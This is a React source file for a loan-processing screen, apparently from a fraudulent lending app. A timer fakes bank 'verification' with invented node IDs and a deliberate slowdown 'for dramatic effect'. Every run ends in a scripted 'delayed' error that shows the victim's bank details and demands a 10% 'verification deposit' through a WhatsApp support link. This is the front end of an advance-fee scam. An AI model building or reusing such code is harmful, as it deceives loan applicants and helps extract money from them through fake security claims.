/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useEffect, useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { useNavigate, useParams } from 'react-router-dom';
import { doc, getDoc, onSnapshot } from 'firebase/firestore';
import { db } from '../lib/firebase';
import { ShieldCheck, AlertCircle, MessageSquare, ArrowRight, Download } from 'lucide-react';
import { formatCurrency, cn } from '../lib/utils';

export const LoanProcessingPage: React.FC = () => {
  const { applicationId } = useParams();
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);
  const [loan, setLoan] = useState<any>(null);
  const [isCompleted, setIsCompleted] = useState(false);
  const [supportLink, setSupportLink] = useState('https://wa.me/something');

  useEffect(() => {
    if (!applicationId) return;

    const fetchLoan = async () => {
      const docRef = doc(db, 'loanApplications', applicationId);
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) {
        setLoan(docSnap.data());
      }
    };

    const fetchSettings = async () => {
      const settingsSnap = await getDoc(doc(db, 'settings', 'global'));
      if (settingsSnap.exists()) {
        const data = settingsSnap.data();
        if (data.whatsappAdmin) {
          setSupportLink(`https://wa.me/${data.whatsappAdmin.replace('+', '')}`);
        }
      }
    };

    fetchLoan();
    fetchSettings();

    // Simulation of processing
    const duration = 8000; // 8 seconds total
    const interval = 50;
    const increment = 100 / (duration / interval);

    const timer = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(timer);
          setIsCompleted(true);
          return 100;
        }
        
        // Slow down significantly at 95% for dramatic effect
        let currentIncrement = increment;
        if (prev >= 98) {
          currentIncrement = 0.05; // Very slow red state
        } else if (prev >= 95) {
          currentIncrement = 0.15; // Starting to lag
        }

        return Math.min(prev + currentIncrement, 100);
      });
    }, interval);

    return () => clearInterval(timer);
  }, [applicationId]);

  if (!loan && progress < 5) {
     return (
       <div className="min-h-screen bg-[#0A0A0A] flex flex-col items-center justify-center gap-6">
         <div className="w-16 h-16 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin shadow-2xl shadow-blue-500/10" />
         <div className="flex flex-col items-center gap-2">
            <p className="text-[10px] font-black tracking-[0.5em] text-slate-500 uppercase">Synchronizing Node...</p>
            <p className="text-[8px] font-bold tracking-widest text-slate-700 uppercase">Freedom Secure Network v4.2</p>
         </div>
       </div>
     );
  }

  const depositAmount = (loan?.amountRequested || 0) * 0.1;

  return (
    <div className="flex flex-col items-center gap-10 pb-24 relative min-h-screen pt-16 px-6">
      
      {!isCompleted ? (
        <div className="flex flex-col items-center gap-12 w-full max-w-sm mt-10">
          <div className="relative w-64 h-64 flex items-center justify-center">
            {/* Animated Ring */}
            <svg className="w-full h-full -rotate-90">
              <circle
                cx="128"
                cy="128"
                r="120"
                fill="none"
                stroke="rgba(255,255,255,0.05)"
                strokeWidth="8"
              />
              <motion.circle
                cx="128"
                cy="128"
                r="120"
                fill="none"
                stroke={progress >= 98 ? "#ef4444" : "#2563eb"}
                strokeWidth="12"
                strokeDasharray="753.98"
                strokeDashoffset={753.98 * (1 - progress / 100)}
                strokeLinecap="round"
                className="transition-colors duration-500 shadow-[0_0_20px_rgba(37,99,235,0.3)]"
              />
            </svg>
            
            <div className="absolute inset-0 flex flex-col items-center justify-center">
              <span className={cn(
                "text-6xl font-black italic tracking-tighter transition-colors duration-500",
                progress >= 98 ? "text-red-500" : "text-white"
              )}>
                {Math.floor(progress)}%
              </span>
              <p className="text-[10px] text-slate-500 font-black uppercase tracking-[0.3em] mt-2">Processing</p>
            </div>
          </div>

          <div className="text-center space-y-4">
             <div className="flex items-center gap-3 justify-center">
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-ping" />
                <h2 className="text-xl font-black text-white uppercase tracking-widest italic">Verification Active</h2>
             </div>
             <p className="text-xs text-slate-400 font-medium max-w-[250px] mx-auto leading-relaxed">
               Connecting to Secure Banking Nodes and validating financial credentials...
             </p>
          </div>

          <div className="w-full glass-panel p-6 rounded-3xl border-white/5 space-y-4">
             <div className="flex items-center justify-between opacity-50">
                <span className="text-[9px] font-black uppercase tracking-widest text-slate-400">Node ID</span>
                <span className="text-[9px] font-black uppercase tracking-widest text-white">FRDM-TX-9921</span>
             </div>
             <div className="h-1 w-full bg-white/5 rounded-full overflow-hidden">
                <motion.div 
                   initial={{ x: '-100%' }}
                   animate={{ x: '100%' }}
                   transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                   className="h-full w-1/3 bg-blue-500/50 blur-[2px]"
                />
             </div>
          </div>
        </div>
      ) : (
        <motion.div 
           initial={{ opacity: 0, y: 20 }}
           animate={{ opacity: 1, y: 0 }}
           className="w-full flex flex-col gap-8 max-w-sm"
        >
          {/* Error Panel */}
          <div className="glass-panel border-red-500/20 bg-slate-900 rounded-[2.5rem] p-8 relative overflow-hidden">
            <div className="absolute top-0 right-0 p-8 opacity-5">
               <AlertCircle className="w-24 h-24 text-red-500" />
            </div>

            <div className="flex items-center gap-4 mb-8">
               <div className="w-12 h-12 rounded-2xl bg-red-500/10 flex items-center justify-center text-red-500 border border-red-500/20">
                  <AlertCircle className="w-6 h-6" />
               </div>
               <div>
                  <h2 className="text-xl font-black text-white italic tracking-tighter uppercase">Loan Processing Delayed</h2>
                  <p className="text-[10px] text-red-400 font-black uppercase tracking-widest">Action Required</p>
               </div>
            </div>

            <p className="text-xs text-slate-400 font-medium leading-relaxed mb-8">
              We are currently unable to complete the transfer to the provided bank account. System flags indicate a requirement for account verification.
            </p>

            <div className="space-y-4 pt-6 border-t border-white/5">
                <DetailRow label="Primary Holder" value={loan?.fullName} />
                <DetailRow label="Target Bank" value={loan?.bankName} />
                <DetailRow label="Account Number" value={loan?.accountNumber} />
                <DetailRow label="Release Amount" value={formatCurrency(loan?.amountRequested || 0)} highlight />
            </div>
          </div>

          {/* Verification Box */}
          <div className="glass-panel border-blue-500/20 bg-blue-500/5 rounded-3xl p-6">
             <div className="flex items-start gap-4">
                <div className="p-3 bg-blue-600 rounded-xl text-white shadow-lg shadow-blue-600/30">
                   <ShieldCheck className="w-6 h-6" />
                </div>
                <div className="flex-1">
                   <p className="text-[9px] font-black text-blue-400 uppercase tracking-widest mb-1">Security Instruction</p>
                   <p className="text-xs text-slate-300 font-bold leading-relaxed">
                     A <span className="text-blue-400">10% verification deposit</span> of <span className="text-white text-base block mt-1 font-black underline decoration-blue-500">{formatCurrency(depositAmount)}</span> must be completed to confirm account authenticity for successful withdrawal.
                   </p>
                </div>
             </div>
          </div>

          <div className="text-center space-y-6">
             <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest bg-slate-800/30 py-4 rounded-2xl border border-white/5">
               Please contact support for account verification and further assistance.
             </p>

             <div className="flex flex-col gap-4">
               <a 
                 href={supportLink}
                 target="_blank"
                 rel="noreferrer"
                 className="w-full py-5 bg-emerald-600 hover:bg-emerald-500 text-white font-black rounded-3xl flex items-center justify-center gap-3 shadow-xl transition-all active:scale-95 text-xs uppercase tracking-[0.2em]"
               >
                 Contact Official Support <MessageSquare className="w-4 h-4" />
               </a>
               
               <button 
                 onClick={() => navigate('/landing')}
                 className="w-full py-4 text-slate-500 font-black text-[10px] uppercase tracking-[0.3em] hover:text-white transition-colors"
               >
                 Return to portal
               </button>
             </div>
          </div>
        </motion.div>
      )}

      {/* Background Decor */}
      <div className="fixed inset-0 pointer-events-none -z-10 bg-[#0A0A0A]">
         <div className="absolute top-0 right-0 w-[500px] h-[500px] bg-blue-600/5 rounded-full blur-[120px]" />
         <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-purple-600/5 rounded-full blur-[120px]" />
      </div>
    </div>
  );
};

const DetailRow = ({ label, value, highlight = false }: any) => (
  <div className="flex items-center justify-between">
    <span className="text-[9px] font-black text-slate-500 uppercase tracking-widest">{label}</span>
    <span className={cn("text-xs font-black uppercase tracking-tight", highlight ? "text-blue-400" : "text-white")}>
      {value}
    </span>
  </div>
);
